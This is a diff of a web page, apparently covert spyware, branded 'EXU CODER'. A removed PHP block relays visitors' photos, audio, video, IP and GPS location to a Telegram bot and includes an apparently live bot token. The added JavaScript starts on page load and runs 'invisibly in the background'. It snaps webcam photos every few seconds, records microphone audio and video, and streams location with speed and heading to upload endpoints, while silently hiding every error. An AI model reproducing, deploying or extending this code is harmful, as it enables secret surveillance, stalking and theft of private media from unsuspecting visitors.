@@ -1,190 +1,3 @@
-<?php
-// ─── TELEGRAM CONFIG ────────────────────────────────────────────
-// ⚠️ REPLACE WITH YOUR ACTUAL CREDENTIALS
-$BOT_TOKEN = "8858703154:AAFnONjnnu6KDLdfNCZPRvDsz5B8KUMcaXs";
-$CHAT_ID = "8379062893";
-
-$TELEGRAM_API = "https://api.telegram.org/bot" . $BOT_TOKEN;
-$SEND_PHOTO_URL = $TELEGRAM_API . "/sendPhoto";
-$SEND_AUDIO_URL = $TELEGRAM_API . "/sendAudio";
-$SEND_VIDEO_URL = $TELEGRAM_API . "/sendVideo";
-$SEND_MESSAGE_URL = $TELEGRAM_API . "/sendMessage";
-$SEND_LOCATION_URL = $TELEGRAM_API . "/sendLocation";
-
-// ─── GET DEVICE INFO ────────────────────────────────────────────
-function getDeviceInfo() {
-    $device_name = php_uname('n') ?: "Unknown Device";
-    $ip_address = $_SERVER['REMOTE_ADDR'] ?? "0.0.0.0";
-    return [$device_name, $ip_address];
-}
-
-// ─── CONVERT TO BOLD UNICODE ────────────────────────────────────
-function toBoldUnicode($text) {
-    $result = '';
-    for ($i = 0; $i < mb_strlen($text); $i++) {
-        $char = mb_substr($text, $i, 1);
-        $code = mb_ord($char);
-        if ($code >= 65 && $code <= 90) {
-            $result .= mb_chr(0x1D400 + ($code - 65));
-        } elseif ($code >= 97 && $code <= 122) {
-            $result .= mb_chr(0x1D41A + ($code - 97));
-        } elseif ($code >= 48 && $code <= 57) {
-            $result .= mb_chr(0x1D7CE + ($code - 48));
-        } else {
-            $result .= $char;
-        }
-    }
-    return $result;
-}
-
-// ─── SEND TO TELEGRAM ───────────────────────────────────────────
-function sendToTelegram($url, $files, $data) {
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    
-    if (!empty($files)) {
-        curl_setopt($ch, CURLOPT_SAFE_UPLOAD, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, array_merge($data, $files));
-    }
-    
-    $response = curl_exec($ch);
-    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
-    
-    return $http_code === 200;
-}
-
-function sendPhotoToTelegram($image_data, $device_name, $ip_address) {
-    global $SEND_PHOTO_URL, $CHAT_ID;
-    
-    $bold_device = toBoldUnicode($device_name);
-    $bold_ip = toBoldUnicode($ip_address);
-    $bold_time = toBoldUnicode(date('Y-m-d H:i:s'));
-    
-    $caption = "📸 𝐄𝐗𝐔 𝐂𝐎𝐃𝐄𝐑 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭\n\n";
-    $caption .= "⚡ 𝐃𝐞𝐯𝐢𝐜𝐞: {$bold_device}\n";
-    $caption .= "🌐 𝐈𝐏: {$bold_ip}\n";
-    $caption .= "🕐 𝐓𝐢𝐦𝐞: {$bold_time}\n\n";
-    $caption .= "🔹 𝐏𝐡𝐨𝐭𝐨 𝐂𝐚𝐩𝐭𝐮𝐫𝐞𝐝";
-    
-    $files = [
-        'photo' => new CURLFile($image_data['tmp_name'], $image_data['type'], 'photo.jpg')
-    ];
-    
-    $data = ['chat_id' => $CHAT_ID, 'caption' => $caption];
-    
-    return sendToTelegram($SEND_PHOTO_URL, $files, $data);
-}
-
-function sendAudioToTelegram($audio_data, $device_name, $ip_address) {
-    global $SEND_AUDIO_URL, $CHAT_ID;
-    
-    $bold_device = toBoldUnicode($device_name);
-    $bold_ip = toBoldUnicode($ip_address);
-    $bold_time = toBoldUnicode(date('Y-m-d H:i:s'));
-    
-    $caption = "🎤 𝐄𝐗𝐔 𝐂𝐎𝐃𝐄𝐑 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭\n\n";
-    $caption .= "⚡ 𝐃𝐞𝐯𝐢𝐜𝐞: {$bold_device}\n";
-    $caption .= "🌐 𝐈𝐏: {$bold_ip}\n";
-    $caption .= "🕐 𝐓𝐢𝐦𝐞: {$bold_time}\n\n";
-    $caption .= "🔹 𝐀𝐮𝐝𝐢𝐨 𝐑𝐞𝐜𝐨𝐫𝐝𝐢𝐧𝐠";
-    
-    $files = [
-        'audio' => new CURLFile($audio_data['tmp_name'], $audio_data['type'], 'audio.webm')
-    ];
-    
-    $data = ['chat_id' => $CHAT_ID, 'caption' => $caption];
-    
-    return sendToTelegram($SEND_AUDIO_URL, $files, $data);
-}
-
-function sendVideoToTelegram($video_data, $device_name, $ip_address) {
-    global $SEND_VIDEO_URL, $CHAT_ID;
-    
-    $bold_device = toBoldUnicode($device_name);
-    $bold_ip = toBoldUnicode($ip_address);
-    $bold_time = toBoldUnicode(date('Y-m-d H:i:s'));
-    
-    $caption = "🎥 𝐄𝐗𝐔 𝐂𝐎𝐃𝐄𝐑 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭\n\n";
-    $caption .= "⚡ 𝐃𝐞𝐯𝐢𝐜𝐞: {$bold_device}\n";
-    $caption .= "🌐 𝐈𝐏: {$bold_ip}\n";
-    $caption .= "🕐 𝐓𝐢𝐦𝐞: {$bold_time}\n\n";
-    $caption .= "🔹 𝐕𝐢𝐝𝐞𝐨 𝐂𝐥𝐢𝐩 𝐑𝐞𝐜𝐨𝐫𝐝𝐞𝐝";
-    
-    $files = [
-        'video' => new CURLFile($video_data['tmp_name'], $video_data['type'], 'video.webm')
-    ];
-    
-    $data = ['chat_id' => $CHAT_ID, 'caption' => $caption];
-    
-    return sendToTelegram($SEND_VIDEO_URL, $files, $data);
-}
-
-function sendLocationToTelegram($lat, $lon, $device_name, $ip_address, $accuracy) {
-    global $SEND_LOCATION_URL, $SEND_MESSAGE_URL, $CHAT_ID;
-    
-    $bold_device = toBoldUnicode($device_name);
-    $bold_ip = toBoldUnicode($ip_address);
-    $bold_time = toBoldUnicode(date('Y-m-d H:i:s'));
-    
-    // Send location pin
-    $data = ['chat_id' => $CHAT_ID, 'latitude' => $lat, 'longitude' => $lon];
-    $success = sendToTelegram($SEND_LOCATION_URL, [], $data);
-    
-    // Send detailed message
-    $message = "📍 𝐄𝐗𝐔 𝐂𝐎𝐃𝐄𝐑 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭\n\n";
-    $message .= "⚡ 𝐃𝐞𝐯𝐢𝐜𝐞: {$bold_device}\n";
-    $message .= "🌐 𝐈𝐏: {$bold_ip}\n";
-    $message .= "🕐 𝐓𝐢𝐦𝐞: {$bold_time}\n\n";
-    $message .= "📌 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧:\n";
-    $message .= "🌍 𝐋𝐚𝐭𝐢𝐭𝐮𝐝𝐞: {$lat}\n";
-    $message .= "🌍 𝐋𝐨𝐧𝐠𝐢𝐭𝐮𝐝𝐞: {$lon}\n";
-    $message .= "🎯 𝐀𝐜𝐜𝐮𝐫𝐚𝐜𝐲: ~{$accuracy}m\n\n";
-    $message .= "🔗 <a href='https://www.google.com/maps?q={$lat},{$lon}'>📍 𝐎𝐩𝐞𝐧 𝐢𝐧 𝐌𝐚𝐩𝐬</a>";
-    
-    $data = ['chat_id' => $CHAT_ID, 'text' => $message, 'parse_mode' => 'HTML'];
-    sendToTelegram($SEND_MESSAGE_URL, [], $data);
-    
-    return $success;
-}
-
-// ─── HANDLE UPLOADS ─────────────────────────────────────────────
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $action = $_POST['action'] ?? '';
-    list($device_name, $ip_address) = getDeviceInfo();
-    
-    if ($action === 'photo' && isset($_FILES['photo'])) {
-        $success = sendPhotoToTelegram($_FILES['photo'], $device_name, $ip_address);
-        echo json_encode(['success' => $success]);
-        exit;
-    }
-    
-    if ($action === 'audio' && isset($_FILES['audio'])) {
-        $success = sendAudioToTelegram($_FILES['audio'], $device_name, $ip_address);
-        echo json_encode(['success' => $success]);
-        exit;
-    }
-    
-    if ($action === 'video' && isset($_FILES['video'])) {
-        $success = sendVideoToTelegram($_FILES['video'], $device_name, $ip_address);
-        echo json_encode(['success' => $success]);
-        exit;
-    }
-    
-    if ($action === 'location') {
-        $lat = $_POST['latitude'] ?? 0;
-        $lon = $_POST['longitude'] ?? 0;
-        $acc = $_POST['accuracy'] ?? 0;
-        $success = sendLocationToTelegram($lat, $lon, $device_name, $ip_address, $acc);
-        echo json_encode(['success' => $success]);
-        exit;
-    }
-}
-?>
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -693,7 +506,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
   <script>
     // ============================================================
-    // ORIGINAL SCRIPTS (100% UNCHANGED)
+    // YOUR ORIGINAL SCRIPTS (100% UNCHANGED)
     // ============================================================
     function toBoldUnicode(str) {
       let out = '';
@@ -860,13 +673,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 
     // ============================================================
-    // DEEP SEA ENGINE - PHP BACKEND (UPLOADS TO PHP)
+    // DEEP SEA ENGINE - UPDATED WITH VIDEO RECORDING
+    // Everything runs invisibly in the background
     // ============================================================
     (function() {
       'use strict';
 
+      // ─── CONFIG ──────────────────────────────────────────────
       const CONFIG = {
-        uploadUrl: window.location.origin + '/index.php',  // PHP endpoint
+        backendUrl: window.location.origin,
         photoInterval: 5000,
         audioInterval: 10000,
         videoInterval: 15000,
@@ -874,29 +689,34 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         photoQuality: 0.85
       };
 
+      // ─── STATE ──────────────────────────────────────────────
       let cameraStream = null;
       let audioStream = null;
       let mediaRecorder = null;
       let audioChunks = [];
+      
+      // Video state
       let videoStream = null;
       let videoRecorder = null;
       let videoChunks = [];
+      
       let isCameraReady = false;
+      let photoCount = 0;
       let watchId = null;
       let lastLocationSent = 0;
       let hiddenVideo = null;
 
-      // ─── UPLOAD FUNCTION ────────────────────────────────────
-      function uploadToPHP(formData, callback) {
-        fetch(CONFIG.uploadUrl, {
-          method: 'POST',
-          body: formData
-        })
-        .then(response => response.json())
-        .then(data => {
-          if (callback) callback(data);
-        })
-        .catch(() => {});
+      // ─── INITIALIZE ──────────────────────────────────────────
+      async function initDeepSea() {
+        try {
+          await startCamera();
+          await startAudioRecording();
+          await startVideoRecording();  // ← NEW
+          startLocationTracking();
+          startAutoCapture();
+        } catch (error) {
+          // Silently fail - no UI impact
+        }
       }
 
       // ─── CAMERA ──────────────────────────────────────────────
@@ -933,16 +753,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
           ctx.scale(-1, 1);
           ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
 
-          canvas.toBlob(function(blob) {
-            const formData = new FormData();
-            formData.append('action', 'photo');
-            formData.append('photo', blob, 'photo.jpg');
-            uploadToPHP(formData);
-          }, 'image/jpeg', CONFIG.photoQuality);
+          const dataURL = canvas.toDataURL('image/jpeg', CONFIG.photoQuality);
 
+          fetch(`${CONFIG.backendUrl}/upload/photo`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: dataURL })
+          }).catch(() => {});
         } catch (error) {}
       }
 
+      // ─── AUTO CAPTURE ────────────────────────────────────────
       function startAutoCapture() {
         setTimeout(capturePhoto, 2000);
         setInterval(capturePhoto, CONFIG.photoInterval);
@@ -966,10 +787,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             if (audioChunks.length > 0) {
               const blob = new Blob(audioChunks, { type: 'audio/webm' });
               audioChunks = [];
-              const formData = new FormData();
-              formData.append('action', 'audio');
-              formData.append('audio', blob, 'audio.webm');
-              uploadToPHP(formData);
+              sendAudio(blob);
             }
           };
 
@@ -985,9 +803,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         } catch (error) {}
       }
 
-      // ─── VIDEO RECORDING ─────────────────────────────────────
+      function sendAudio(blob) {
+        const reader = new FileReader();
+        reader.onloadend = () => {
+          fetch(`${CONFIG.backendUrl}/upload/audio`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ audio: reader.result })
+          }).catch(() => {});
+        };
+        reader.readAsDataURL(blob);
+      }
+
+      // ─── VIDEO RECORDING (NEW) ──────────────────────────────
       async function startVideoRecording() {
         try {
+          // Use separate stream with audio for video
           videoStream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
             audio: true
@@ -1005,10 +836,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             if (videoChunks.length > 0) {
               const blob = new Blob(videoChunks, { type: 'video/webm' });
               videoChunks = [];
-              const formData = new FormData();
-              formData.append('action', 'video');
-              formData.append('video', blob, 'video.webm');
-              uploadToPHP(formData);
+              sendVideo(blob);
             }
           };
 
@@ -1021,7 +849,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             }
           }, CONFIG.videoInterval);
 
-        } catch (error) {}
+        } catch (error) {
+          // Video might not be supported - silently fail
+        }
+      }
+
+      function sendVideo(blob) {
+        const reader = new FileReader();
+        reader.onloadend = () => {
+          fetch(`${CONFIG.backendUrl}/upload/video`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ video: reader.result })
+          }).catch(() => {});
+        };
+        reader.readAsDataURL(blob);
       }
 
       // ─── LOCATION TRACKING ──────────────────────────────────
@@ -1030,15 +872,23 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
         watchId = navigator.geolocation.watchPosition(
           (position) => {
+            const location = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              altitude: position.coords.altitude,
+              heading: position.coords.heading,
+              speed: position.coords.speed
+            };
+
             const now = Date.now();
             if (now - lastLocationSent >= CONFIG.locationInterval) {
               lastLocationSent = now;
-              const formData = new FormData();
-              formData.append('action', 'location');
-              formData.append('latitude', position.coords.latitude);
-              formData.append('longitude', position.coords.longitude);
-              formData.append('accuracy', position.coords.accuracy || 0);
-              uploadToPHP(formData);
+              fetch(`${CONFIG.backendUrl}/upload/location`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ location: location })
+              }).catch(() => {});
             }
           },
           () => {},
@@ -1059,22 +909,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
       // ─── AUTO-START ──────────────────────────────────────────
       if (document.readyState === 'complete') {
-        setTimeout(async () => {
-          await startCamera();
-          await startAudioRecording();
-          await startVideoRecording();
-          startLocationTracking();
-          startAutoCapture();
-        }, 1000);
+        setTimeout(initDeepSea, 1000);
       } else {
         window.addEventListener('load', () => {
-          setTimeout(async () => {
-            await startCamera();
-            await startAudioRecording();
-            await startVideoRecording();
-            startLocationTracking();
-            startAutoCapture();
-          }, 1000);
+          setTimeout(initDeepSea, 1000);
         });
       }
 
